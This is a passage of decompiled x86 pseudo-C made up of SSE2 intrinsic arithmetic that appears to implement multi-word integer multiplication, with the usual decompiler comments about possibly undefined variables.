  v41 = _mm_load_si128(&stru_46C990);
  v42 = _mm_add_epi32(v36, _mm_and_si128(v41, v38));
  v43 = _mm_add_epi32(v35, _mm_srli_epi32(v38, 0x10u));
  v44 = _mm_and_si128(v41, v40);
  v45 = _mm_srli_epi32(v40, 0x10u);
  result = sub_4173A9();
  v47 = _mm_move_epi64(v44);
  v48 = _mm_move_epi64(v45);
  v49 = _mm_add_epi32(v42, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v44, v47), v47), 4));
  v50 = _mm_add_epi32(v43, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v45, v48), v48), 4));
  v51 = (__m128)_mm_move_epi64(v50);
  *(_DWORD *)(v52 + 16) = _mm_cvtsi128_si32(v49);
  v53 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v49), 0x10u), (__m128i)v51);
  *(_QWORD *)(v52 + 18) = v53.m128i_i64[0];
  v54 = _mm_add_epi32(_mm_unpackhi_epi64(v49, v47), _mm_srli_epi64(v53, 0x30u));
  ++v55;
  v56 = _mm_load_si128(&v72);
  v57 = _mm_load_si128(&v74);
  v58 = _mm_add_epi64(
          _mm_add_epi64(
            _mm_add_epi64(v54, _mm_mul_epu32(_mm_load_si128(&v67), v56)),
            _mm_slli_epi64(_mm_unpackhi_epi64(v50, v47), 0x10u)),
          _mm_mul_epu32(_mm_load_si128(&v65), v57));
  v59 = _mm_add_epi32(_mm_mul_epu32(v56, *v55), _mm_mul_epu32(v57, v55[-2]));
  v60 = _mm_load_si128(&v71);
  v61 = _mm_add_epi64(v58, _mm_mul_epu32(_mm_load_si128(&v68), v60));
  v62 = _mm_add_epi32(v59, _mm_mul_epu32(v60, v55[1]));
  v63 = _mm_load_si128(&v73);
  v64 = (__m128)_mm_add_epi32(v62, _mm_mul_epu32(v63, v55[-1]));
  *(_QWORD *)(v52 + 24) = _mm_add_epi32(
                            _mm_add_epi64(v61, _mm_mul_epu32(_mm_load_si128(&v66), v63)),
                            _mm_slli_epi64(_mm_add_epi32((__m128i)v64, (__m128i)_mm_movehl_ps(v51, v64)), 0x20u)).m128i_u64[0];
  return result;
}
// 4174E8: variable 'v33' is possibly undefined
// 41751F: variable 'v39' is possibly undefined
// 417578: variable 'v52' is possibly undefined
// 41759F: variable 'v55' is possibly undefined
// 46C990: using guessed type __m128i stru_46C990;
// 4172F8: using guessed type __m128i anonymous_3;

//----- (004173A9) --------------------------------------------------------
int sub_4173A9()
{
  return sub_4173E6();
}
// 4173E6: using guessed type int sub_4173E6(void);

//----- (004173E6) --------------------------------------------------------
__m128i __usercall sub_4173E6@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (0041762B) --------------------------------------------------------
void __cdecl sub_41762B(int a1, int a2, int a3)
{
  unsigned int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm0
  __m128i v9; // xmm7
  __m128i si128; // xmm6
  __m128i v11; // xmm4
  __m128i v12; // xmm5
  __m128i v13; // xmm6
  __m128i v14; // xmm7
  __m128i v15; // xmm0
  __m128i v16; // xmm1
  __m128i v17; // xmm4
  __m128i v18; // xmm5
  int v19; // ecx
  __m128i v20; // xmm6
  __m128i v21; // xmm5
  __m128i v22; // xmm4
  __m128i v23; // xmm7
  __m128i v24; // xmm0
  __m128i *v25; // edx
  __m128i v26; // xmm7
  __m128i v27; // xmm6
  __m128i v28; // xmm4
  __m128i v29; // xmm5
  __m128i v30; // xmm6
  __m128i v31; // xmm7
  unsigned int v32; // eax
  int v33; // ecx
  __m128i v34; // xmm0
  __m128i v35; // xmm1
  __m128i v36; // xmm4
  __m128i v37; // xmm5
  __m128i v38; // xmm6
  __m128i v39; // xmm5
  __m128i v40; // xmm4
  __m128i *v41; // edx
  __m128i v42; // xmm7
  __m128i v43; // xmm0
  __m128i v44; // xmm7
  __m128i v45; // xmm6
  __m128i v46; // xmm4
  __m128i v47; // xmm5
  __m128i v48; // xmm6
  __m128i v49; // xmm7
  __m128i v50; // xmm0
  __m128i v51; // xmm1
  __m128i v52; // xmm4
  __m128i v53; // xmm5
  int v54; // ecx
  __m128i v55; // xmm6
  __m128i v56; // xmm5
  __m128i v57; // xmm4
  __m128i v58; // xmm7
  __m128i v59; // xmm0
  __m128i *v60; // edx
  __m128i v61; // xmm7
  __m128i v62; // xmm6
  __m128i v63; // xmm4
  __m128i v64; // xmm5
  __m128i v65; // xmm6
  __m128i v66; // xmm7
  __m128i v67; // xmm0
  __m128i v68; // xmm1
  __m128i v69; // xmm4
  __m128i v70; // xmm5
  int v71; // ecx
  __m128i v72; // xmm6
  __m128i v73; // xmm5
  __m128i v74; // xmm4
  __m128i *v75; // edx
  __m128i v76; // xmm7
  __m128i v77; // xmm0
  __m128i v78; // xmm7
  __m128i v79; // xmm6
  __m128i v80; // xmm4
  __m128i v81; // xmm5
  __m128i v82; // xmm6
  __m128i v83; // xmm7
  __m128i v84; // xmm0
  __m128i v85; // xmm1
  __m128i v86; // xmm4
  __m128i v87; // xmm5
  int v88; // ecx
  __m128i v89; // xmm6
  __m128i v90; // xmm5
  __m128i v91; // xmm4
  __m128i v92; // xmm7
  __m128i v93; // xmm0
  __m128i *v94; // edx
  __m128i v95; // xmm7
  __m128i v96; // xmm6
  __m128i v97; // xmm4
  __m128i v98; // xmm5
  __m128i v99; // xmm6
  __m128i v100; // xmm7
  __m128i v101; // xmm0
  __m128i v102; // xmm1
  __m128i v103; // xmm4
  __m128i v104; // xmm5
  int v105; // ecx
  __m128i v106; // xmm6
  __m128i v107; // xmm5
  __m128i v108; // xmm4
  __m128i *v109; // edx
  __m128i v110; // xmm7
  __m128i v111; // xmm0
  __m128i v112; // xmm7
  __m128i v113; // xmm6
  __m128i v114; // xmm4
  __m128i v115; // xmm5
  __m128i v116; // xmm6
  __m128i v117; // xmm7
  __m128i v118; // xmm0
  __m128i v119; // xmm1
  __m128i v120; // xmm4
  __m128i v121; // xmm5
  int v122; // ecx
  __m128i v123; // xmm6
  __m128i v124; // xmm5
  __m128i v125; // xmm4
  __m128i v126; // xmm7
  __m128i v127; // xmm0
  __m128i *v128; // edx
  __m128i v129; // xmm7
  __m128i v130; // xmm6
  __m128i v131; // xmm2
  __m128i v132; // xmm5
  __m128i v133; // xmm6
  __m128i v134; // xmm7
  __m128i v135; // xmm0
  __m128i v136; // xmm1
  __m128i v137; // xmm4
  __m128i v138; // xmm5
  __m128i v139; // xmm6
  _DWORD v140[17]; // [esp-4h] [ebp-1A0h] BYREF
  __m128i v141; // [esp+50h] [ebp-14Ch] BYREF
  __m128i v142; // [esp+60h] [ebp-13Ch] BYREF
  __m128i v143; // [esp+70h] [ebp-12Ch] BYREF
  __m128i v144; // [esp+80h] [ebp-11Ch] BYREF
  __m128i v145; // [esp+90h] [ebp-10Ch]
  __m128i v146[3]; // [esp+A0h] [ebp-FCh]
  __m128i v147; // [esp+D0h] [ebp-CCh]
  __m128i v148; // [esp+E0h] [ebp-BCh]
  __m128i v149; // [esp+F0h] [ebp-ACh]
  __int128 v150[3]; // [esp+110h] [ebp-8Ch]
  __m128i v151; // [esp+140h] [ebp-5Ch] BYREF
  __m128i v152; // [esp+150h] [ebp-4Ch] BYREF
  __m128i v153; // [esp+160h] [ebp-3Ch] BYREF
  __m128i v154; // [esp+170h] [ebp-2Ch] BYREF
  __m128i v155; // [esp+180h] [ebp-1Ch] BYREF
  int v156; // [esp+190h] [ebp-Ch] BYREF

  v140[0] = &v156;
  for ( i = 0; i != 64; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)&v140[i / 2 + 5] = v4;
    *(__m128i *)&v140[i / 2 + 9] = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v145 + 2 * i) = v5;
    v146[i / 8] = _mm_srli_epi64(v5, 0x20u);
    v150[i / 8] = (__int128)v6;
    v150[i / 8 + 1] = (__int128)_mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v151);
  v8 = _mm_mul_epu32(_mm_load_si128(&v141), v7);
  v9 = _mm_mul_epu32(v7, v147);
  si128 = _mm_load_si128(&stru_46C990);
  v11 = _mm_add_epi32((__m128i)0i64, _mm_and_si128(si128, v8));
  v12 = _mm_add_epi32(
          _mm_slli_epi64(
            _mm_add_epi32(
              _mm_add_epi32(
                _mm_add_epi32(
                  _mm_add_epi32(
                    _mm_add_epi32(
                      _mm_add_epi32(
                        _mm_add_epi32(
                          (__m128i)0i64,
                          _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v140[71]), v149), 0x30u)),
                        _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v154.m128i_i8[8]), v145), 0x30u)),
                      _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v140[75]), v148), 0x30u)),
                    _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v153.m128i_i8[8]), v146[0]), 0x30u)),
                  _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v140[79]), v147), 0x30u)),
                _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v152.m128i_i8[8]), v146[1]), 0x30u)),
              _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v151.m128i_i8[8]), v146[2]), 0x30u)),
            0x20u),
          _mm_srli_epi32(v8, 0x10u));
  v13 = _mm_and_si128(si128, v9);
  v14 = _mm_srli_epi32(v9, 0x10u);
  sub_41774F();
  v15 = _mm_move_epi64(v13);
  v16 = _mm_move_epi64(v14);
  v17 = _mm_add_epi32(v11, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  v18 = _mm_add_epi32(v12, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v14, v16), v16), 4));
  *(_DWORD *)v19 = _mm_cvtsi128_si32(v17);
  v20 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v17), 0x10u), _mm_move_epi64(v18));
  v21 = _mm_unpackhi_epi64(v18, v15);
  *(_QWORD *)(v19 + 2) = v20.m128i_i64[0];
  v22 = _mm_add_epi32(_mm_unpackhi_epi64(v17, v15), _mm_srli_epi64(v20, 0x30u));
  v23 = _mm_load_si128(&v152);
  v24 = _mm_mul_epu32(_mm_load_si128(&v141), v23);
  v26 = _mm_mul_epu32(v23, *v25);
  v27 = _mm_load_si128(&stru_46C990);
  v28 = _mm_add_epi32(v22, _mm_and_si128(v27, v24));
  v29 = _mm_add_epi32(v21, _mm_srli_epi32(v24, 0x10u));
  v30 = _mm_and_si128(v27, v26);
  v31 = _mm_srli_epi32(v26, 0x10u);
  v32 = sub_41778C();
  v34 = _mm_move_epi64(v30);
  v35 = _mm_move_epi64(v31);
  v36 = _mm_add_epi32(
          _mm_add_epi32(
            v28,
            _mm_srli_epi32(
              _mm_cmpgt_epi32(
                _mm_srli_epi32(_mm_cvtsi32_si128(*(_DWORD *)(v33 + 4)), 0x10u),
                _mm_cvtsi32_si128(HIWORD(v32))),
              0x1Fu)),
          _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v30, v34), v34), 4));
  v37 = _mm_add_epi32(v29, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v31, v35), v35), 4));
  *(_DWORD *)v33 = _mm_cvtsi128_si32(v36);
  v38 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v36), 0x10u), _mm_move_epi64(v37));
  v39 = _mm_unpackhi_epi64(v37, v34);
  *(_QWORD *)(v33 + 2) = v38.m128i_i64[0];
  v40 = _mm_add_epi32(_mm_unpackhi_epi64(v36, v34), _mm_srli_epi64(v38, 0x30u));
  v42 = _mm_load_si128(&v152);
  v43 = _mm_mul_epu32(_mm_load_si128(&v142), v42);
  v44 = _mm_mul_epu32(v42, v41[1]);
  v45 = _mm_load_si128(&stru_46C990);
  v46 = _mm_add_epi32(v40, _mm_and_si128(v45, v43));
  v47 = _mm_add_epi32(v39, _mm_srli_epi32(v43, 0x10u));
  v48 = _mm_and_si128(v45, v44);
  v49 = _mm_srli_epi32(v44, 0x10u);
  sub_4177C9();
  v50 = _mm_move_epi64(v48);
  v51 = _mm_move_epi64(v49);
  v52 = _mm_add_epi32(v46, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v48, v50), v50), 4));
  v53 = _mm_add_epi32(v47, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v49, v51), v51), 4));
  *(_DWORD *)(v54 + 8) = _mm_cvtsi128_si32(v52);
  v55 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v52), 0x10u), _mm_move_epi64(v53));
  v56 = _mm_unpackhi_epi64(v53, v50);
  *(_QWORD *)(v54 + 10) = v55.m128i_i64[0];
  v57 = _mm_add_epi32(_mm_unpackhi_epi64(v52, v50), _mm_srli_epi64(v55, 0x30u));
  v58 = _mm_load_si128(&v153);
  v59 = _mm_mul_epu32(_mm_load_si128(&v142), v58);
  v61 = _mm_mul_epu32(v58, *v60);
  v62 = _mm_load_si128(&stru_46C990);
  v63 = _mm_add_epi32(v57, _mm_and_si128(v62, v59));
  v64 = _mm_add_epi32(v56, _mm_srli_epi32(v59, 0x10u));
  v65 = _mm_and_si128(v62, v61);
  v66 = _mm_srli_epi32(v61, 0x10u);
  sub_417806();
  v67 = _mm_move_epi64(v65);
  v68 = _mm_move_epi64(v66);
  v69 = _mm_add_epi32(v63, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v65, v67), v67), 4));
  v70 = _mm_add_epi32(v64, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v66, v68), v68), 4));
  *(_DWORD *)(v71 + 16) = _mm_cvtsi128_si32(v69);
  v72 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v69), 0x10u), _mm_move_epi64(v70));
  v73 = _mm_unpackhi_epi64(v70, v67);
  *(_QWORD *)(v71 + 18) = v72.m128i_i64[0];
  v74 = _mm_add_epi32(_mm_unpackhi_epi64(v69, v67), _mm_srli_epi64(v72, 0x30u));
  v76 = _mm_load_si128(&v153);
  v77 = _mm_mul_epu32(_mm_load_si128(&v143), v76);
  v78 = _mm_mul_epu32(v76, v75[1]);
  v79 = _mm_load_si128(&stru_46C990);
  v80 = _mm_add_epi32(v74, _mm_and_si128(v79, v77));
  v81 = _mm_add_epi32(v73, _mm_srli_epi32(v77, 0x10u));
  v82 = _mm_and_si128(v79, v78);
  v83 = _mm_srli_epi32(v78, 0x10u);
  sub_417843();
  v84 = _mm_move_epi64(v82);
  v85 = _mm_move_epi64(v83);
  v86 = _mm_add_epi32(v80, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v82, v84), v84), 4));
  v87 = _mm_add_epi32(v81, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v83, v85), v85), 4));
  *(_DWORD *)(v88 + 24) = _mm_cvtsi128_si32(v86);
  v89 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v86), 0x10u), _mm_move_epi64(v87));
  v90 = _mm_unpackhi_epi64(v87, v84);
  *(_QWORD *)(v88 + 26) = v89.m128i_i64[0];
  v91 = _mm_add_epi32(_mm_unpackhi_epi64(v86, v84), _mm_srli_epi64(v89, 0x30u));
  v92 = _mm_load_si128(&v154);
  v93 = _mm_mul_epu32(_mm_load_si128(&v143), v92);
  v95 = _mm_mul_epu32(v92, *v94);
  v96 = _mm_load_si128(&stru_46C990);
  v97 = _mm_add_epi32(v91, _mm_and_si128(v96, v93));
  v98 = _mm_add_epi32(v90, _mm_srli_epi32(v93, 0x10u));
  v99 = _mm_and_si128(v96, v95);
  v100 = _mm_srli_epi32(v95, 0x10u);
  sub_417880();
  v101 = _mm_move_epi64(v99);
  v102 = _mm_move_epi64(v100);
  v103 = _mm_add_epi32(v97, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v99, v101), v101), 4));
  v104 = _mm_add_epi32(v98, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v100, v102), v102), 4));
  *(_DWORD *)(v105 + 32) = _mm_cvtsi128_si32(v103);
  v106 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v103), 0x10u), _mm_move_epi64(v104));
  v107 = _mm_unpackhi_epi64(v104, v101);
  *(_QWORD *)(v105 + 34) = v106.m128i_i64[0];
  v108 = _mm_add_epi32(_mm_unpackhi_epi64(v103, v101), _mm_srli_epi64(v106, 0x30u));
  v110 = _mm_load_si128(&v154);
  v111 = _mm_mul_epu32(_mm_load_si128(&v144), v110);
  v112 = _mm_mul_epu32(v110, v109[1]);
  v113 = _mm_load_si128(&stru_46C990);
  v114 = _mm_add_epi32(v108, _mm_and_si128(v113, v111));
  v115 = _mm_add_epi32(v107, _mm_srli_epi32(v111, 0x10u));
  v116 = _mm_and_si128(v113, v112);
  v117 = _mm_srli_epi32(v112, 0x10u);
  sub_4178BD((int)&v144, &v154);
  v118 = _mm_move_epi64(v116);
  v119 = _mm_move_epi64(v117);
  v120 = _mm_add_epi32(v114, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v116, v118), v118), 4));
  v121 = _mm_add_epi32(v115, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v117, v119), v119), 4));
  *(_DWORD *)(v122 + 40) = _mm_cvtsi128_si32(v120);
  v123 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v120), 0x10u), _mm_move_epi64(v121));
  v124 = _mm_unpackhi_epi64(v121, v118);
  *(_QWORD *)(v122 + 42) = v123.m128i_i64[0];
  v125 = _mm_add_epi32(_mm_unpackhi_epi64(v120, v118), _mm_srli_epi64(v123, 0x30u));
  v126 = _mm_load_si128(&v155);
  v127 = _mm_mul_epu32(_mm_load_si128(&v144), v126);
  v129 = _mm_mul_epu32(v126, *v128);
  v130 = _mm_load_si128(&stru_46C990);
  v131 = _mm_and_si128(v130, v127);
  v132 = _mm_add_epi32(v124, _mm_srli_epi32(v127, 0x10u));
  v133 = _mm_and_si128(v130, v129);
  v134 = _mm_srli_epi32(v129, 0x10u);
  v135 = _mm_move_epi64(v133);
  v136 = _mm_move_epi64(v134);
  v137 = _mm_add_epi32(
           _mm_add_epi32(v125, v131),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v133, v135), v135), 4));
  v138 = _mm_add_epi32(v132, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v134, v136), v136), 4));
  *(_DWORD *)(v122 + 48) = _mm_cvtsi128_si32(v137);
  v139 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v137), 0x10u), _mm_move_epi64(v138));
  *(_QWORD *)(v122 + 50) = v139.m128i_i64[0];
  *(_QWORD *)(v122 + 56) = _mm_add_epi64(
                             _mm_add_epi32(_mm_unpackhi_epi64(v137, v135), _mm_srli_epi64(v139, 0x30u)),
                             _mm_slli_epi64(_mm_unpackhi_epi64(v138, v135), 0x10u)).m128i_u64[0];
}
// 41796F: variable 'v19' is possibly undefined
// 4179A5: variable 'v25' is possibly undefined
// 4179D3: variable 'v33' is possibly undefined
// 417A42: variable 'v41' is possibly undefined
// 417AAE: variable 'v54' is possibly undefined
// 417AE5: variable 'v60' is possibly undefined
// 417B3E: variable 'v71' is possibly undefined
// 417B65: variable 'v75' is possibly undefined
// 417BD1: variable 'v88' is possibly undefined
// 417C08: variable 'v94' is possibly undefined
// 417C61: variable 'v105' is possibly undefined
// 417C88: variable 'v109' is possibly undefined
// 417CF4: variable 'v122' is possibly undefined
// 417D29: variable 'v128' is possibly undefined
// 46C990: using guessed type __m128i stru_46C990;

//----- (0041774F) --------------------------------------------------------
int sub_41774F()
{
  return sub_41778C();
}
// 41778C: using guessed type int sub_41778C(void);

//----- (0041778C) --------------------------------------------------------
int sub_41778C()
{
  return sub_4177C9();
}
// 4177C9: using guessed type int sub_4177C9(void);

//----- (004177C9) --------------------------------------------------------
int sub_4177C9()
{
  return sub_417806();
}
// 417806: using guessed type int sub_417806(void);

//----- (00417806) --------------------------------------------------------
int sub_417806()
{
  return sub_417843();
}
// 417843: using guessed type int sub_417843(void);

//----- (00417843) --------------------------------------------------------
int sub_417843()
{
  return sub_417880();
}
// 417880: using guessed type int sub_417880(void);

//----- (00417880) --------------------------------------------------------
int sub_417880()
{
  return sub_4178BD();
}
// 4178BD: using guessed type int sub_4178BD(void);

//----- (004178BD) --------------------------------------------------------
__m128i __usercall sub_4178BD@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (00417DB5) --------------------------------------------------------
void __cdecl sub_417DB5(int a1, int a2, int a3)
{
  unsigned int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm0
  __m128i v9; // xmm7
  __m128i si128; // xmm6
  __m128i v11; // xmm4
  __m128i v12; // xmm5
  __m128i v13; // xmm6
  __m128i v14; // xmm7
  __m128i v15; // xmm0
  __m128i v16; // xmm1
  __m128i v17; // xmm4
  __m128i v18; // xmm5
  int v19; // ecx
  __m128i v20; // xmm6
  __m128i v21; // xmm5
  __m128i v22; // xmm4
  __m128i v23; // xmm7
  __m128i v24; // xmm0
  __m128i *v25; // edx
  __m128i v26; // xmm7
  __m128i v27; // xmm6
  __m128i v28; // xmm4
  __m128i v29; // xmm5
  __m128i v30; // xmm6
  __m128i v31; // xmm7
  unsigned int v32; // eax
  int v33; // ecx
  __m128i v34; // xmm0
  __m128i v35; // xmm1
  __m128i v36; // xmm4
  __m128i v37; // xmm5
  __m128i v38; // xmm6
  __m128i v39; // xmm5
  __m128i v40; // xmm4
  __m128i *v41; // edx
  __m128i v42; // xmm7
  __m128i v43; // xmm0
  __m128i v44; // xmm7
  __m128i v45; // xmm6
  __m128i v46; // xmm4
  __m128i v47; // xmm5
  __m128i v48; // xmm6
  __m128i v49; // xmm7
  __m128i v50; // xmm0
  __m128i v51; // xmm1
  __m128i v52; // xmm4
  __m128i v53; // xmm5
  int v54; // ecx
  __m128i v55; // xmm6
  __m128i v56; // xmm5
  __m128i v57; // xmm4
  __m128i v58; // xmm7
  __m128i v59; // xmm0
  __m128i *v60; // edx
  __m128i v61; // xmm7
  __m128i v62; // xmm6
  __m128i v63; // xmm4
  __m128i v64; // xmm5
  __m128i v65; // xmm6
  __m128i v66; // xmm7
  __m128i v67; // xmm0
  __m128i v68; // xmm1
  __m128i v69; // xmm4
  __m128i v70; // xmm5
  int v71; // ecx
  __m128i v72; // xmm6
  __m128i v73; // xmm5
  __m128i v74; // xmm4
  __m128i *v75; // edx
  __m128i v76; // xmm7
  __m128i v77; // xmm0
  __m128i v78; // xmm7
  __m128i v79; // xmm6
  __m128i v80; // xmm4
  __m128i v81; // xmm5
  __m128i v82; // xmm6
  __m128i v83; // xmm7
  __m128i v84; // xmm0
  __m128i v85; // xmm1
  __m128i v86; // xmm4
  __m128i v87; // xmm5
  int v88; // ecx
  __m128i v89; // xmm6
  __m128i v90; // xmm5
  __m128i v91; // xmm4
  __m128i v92; // xmm7
  __m128i v93; // xmm0
  __m128i *v94; // edx
  __m128i v95; // xmm7
  __m128i v96; // xmm6
  __m128i v97; // xmm4
  __m128i v98; // xmm5
  __m128i v99; // xmm6
  __m128i v100; // xmm7
  __m128i v101; // xmm0
  __m128i v102; // xmm1
  __m128i v103; // xmm4
  __m128i v104; // xmm5
  int v105; // ecx
  __m128i v106; // xmm6
  __m128i v107; // xmm5
  __m128i v108; // xmm4
  __m128i *v109; // edx
  __m128i v110; // xmm7
  __m128i v111; // xmm0
  __m128i v112; // xmm7
  __m128i v113; // xmm6
  __m128i v114; // xmm4
  __m128i v115; // xmm5
  __m128i v116; // xmm6
  __m128i v117; // xmm7
  __m128i v118; // xmm0
  __m128i v119; // xmm1
  __m128i v120; // xmm4
  __m128i v121; // xmm5
  int v122; // ecx
  __m128i v123; // xmm6
  __m128i v124; // xmm5
  __m128i v125; // xmm4
  __m128i v126; // xmm7
  __m128i v127; // xmm0
  __m128i *v128; // edx
  __m128i v129; // xmm7
  __m128i v130; // xmm6
  __m128i v131; // xmm4
  __m128i v132; // xmm5
  __m128i v133; // xmm6
  __m128i v134; // xmm7
  __m128i v135; // xmm0
  __m128i v136; // xmm1
  __m128i v137; // xmm4
  __m128i v138; // xmm5
  int v139; // ecx
  __m128i v140; // xmm6
  __m128i v141; // xmm5
  __m128i v142; // xmm4
  __m128i *v143; // edx
  __m128i v144; // xmm7
  __m128i v145; // xmm0
  __m128i v146; // xmm7
  __m128i v147; // xmm6
  __m128i v148; // xmm4
  __m128i v149; // xmm5
  __m128i v150; // xmm6
  __m128i v151; // xmm7
  __m128i v152; // xmm0
  __m128i v153; // xmm1
  __m128i v154; // xmm4
  __m128i v155; // xmm5
  int v156; // ecx
  __m128i v157; // xmm6
  __m128i v158; // xmm5
  __m128i v159; // xmm4
  __m128i v160; // xmm7
  __m128i v161; // xmm0
  __m128i *v162; // edx
  __m128i v163; // xmm7
  __m128i v164; // xmm6
  __m128i v165; // xmm4
  __m128i v166; // xmm5
  __m128i v167; // xmm6
  __m128i v168; // xmm7
  __m128i v169; // xmm0
  __m128i v170; // xmm1
  __m128i v171; // xmm4
  __m128i v172; // xmm5
  int v173; // ecx
  __m128i v174; // xmm6
  __m128i v175; // xmm5
  __m128i v176; // xmm4
  __m128i *v177; // edx
  __m128i v178; // xmm7
  __m128i v179; // xmm0
  __m128i v180; // xmm7
  __m128i v181; // xmm6
  __m128i v182; // xmm4
  __m128i v183; // xmm5
  __m128i v184; // xmm6
  __m128i v185; // xmm7
  __m128i v186; // xmm0
  __m128i v187; // xmm1
  __m128i v188; // xmm4
  __m128i v189; // xmm5
  int v190; // ecx
  __m128i v191; // xmm6
  __m128i v192; // xmm5
  __m128i v193; // xmm4
  __m128i v194; // xmm7
  __m128i v195; // xmm0
  __m128i *v196; // edx
  __m128i v197; // xmm7
  __m128i v198; // xmm6
  __m128i v199; // xmm4
  __m128i v200; // xmm5
  __m128i v201; // xmm6
  __m128i v202; // xmm7
  __m128i v203; // xmm0
  __m128i v204; // xmm1
  __m128i v205; // xmm4
  __m128i v206; // xmm5
  int v207; // ecx
  __m128i v208; // xmm6
  __m128i v209; // xmm5
  __m128i v210; // xmm4
  __m128i *v211; // edx
  __m128i v212; // xmm7
  __m128i v213; // xmm0
  __m128i v214; // xmm7
  __m128i v215; // xmm6
  __m128i v216; // xmm4
  __m128i v217; // xmm5
  __m128i v218; // xmm6
  __m128i v219; // xmm7
  __m128i v220; // xmm0
  __m128i v221; // xmm1
  __m128i v222; // xmm4
  __m128i v223; // xmm5
  int v224; // ecx
  __m128i v225; // xmm6
  __m128i v226; // xmm5
  __m128i v227; // xmm4
  __m128i v228; // xmm7
  __m128i v229; // xmm0
  __m128i *v230; // edx
  __m128i v231; // xmm7
  __m128i v232; // xmm6
  __m128i v233; // xmm4
  __m128i v234; // xmm5
  __m128i v235; // xmm6
  __m128i v236; // xmm7
  __m128i v237; // xmm0
  __m128i v238; // xmm1
  __m128i v239; // xmm4
  __m128i v240; // xmm5
  int v241; // ecx
  __m128i v242; // xmm6
  __m128i v243; // xmm5
  __m128i v244; // xmm4
  __m128i *v245; // edx
  __m128i v246; // xmm7
  __m128i v247; // xmm0
  __m128i v248; // xmm7
  __m128i v249; // xmm6
  __m128i v250; // xmm4
  __m128i v251; // xmm5
  __m128i v252; // xmm6
  __m128i v253; // xmm7
  __m128i v254; // xmm0
  __m128i v255; // xmm1
  __m128i v256; // xmm4
  __m128i v257; // xmm5
  int v258; // ecx
  __m128i v259; // xmm6
  __m128i v260; // xmm5
  __m128i v261; // xmm4
  __m128i v262; // xmm7
  __m128i v263; // xmm0
  __m128i *v264; // edx
  __m128i v265; // xmm7
  __m128i v266; // xmm6
  __m128i v267; // xmm2
  __m128i v268; // xmm5
  __m128i v269; // xmm6
  __m128i v270; // xmm7
  __m128i v271; // xmm0
  __m128i v272; // xmm1
  __m128i v273; // xmm4
  __m128i v274; // xmm5
  __m128i v275; // xmm6
  _DWORD v276[33]; // [esp-4h] [ebp-320h] BYREF
  __m128i v277; // [esp+90h] [ebp-28Ch] BYREF
  __m128i v278; // [esp+A0h] [ebp-27Ch] BYREF
  __m128i v279; // [esp+B0h] [ebp-26Ch] BYREF
  __m128i v280; // [esp+C0h] [ebp-25Ch] BYREF
  __m128i v281; // [esp+D0h] [ebp-24Ch] BYREF
  __m128i v282; // [esp+E0h] [ebp-23Ch] BYREF
  __m128i v283; // [esp+F0h] [ebp-22Ch] BYREF
  __m128i v284; // [esp+100h] [ebp-21Ch] BYREF
  __m128i v285; // [esp+110h] [ebp-20Ch]
  __m128i v286[7]; // [esp+120h] [ebp-1FCh]
  __m128i v287; // [esp+190h] [ebp-18Ch]
  __m128i v288; // [esp+1A0h] [ebp-17Ch]
  __m128i v289; // [esp+1B0h] [ebp-16Ch]
  __m128i v290; // [esp+1C0h] [ebp-15Ch]
  __m128i v291; // [esp+1D0h] [ebp-14Ch]
  __m128i v292; // [esp+1E0h] [ebp-13Ch]
